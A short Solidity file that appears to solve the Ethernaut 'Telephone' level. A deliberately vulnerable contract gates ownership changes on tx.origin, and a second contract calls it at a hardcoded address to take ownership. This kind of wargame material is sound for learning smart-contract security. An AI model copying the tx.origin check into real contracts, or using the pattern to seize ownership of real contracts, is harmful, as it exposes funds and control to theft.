// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract Call{
  
    Telephone call = Telephone(0xA0b452e5b2bE124156144A582b74E7050De732cA);
    function ownerch(address _address)public {
    call.changeOwner(_address);
    }
}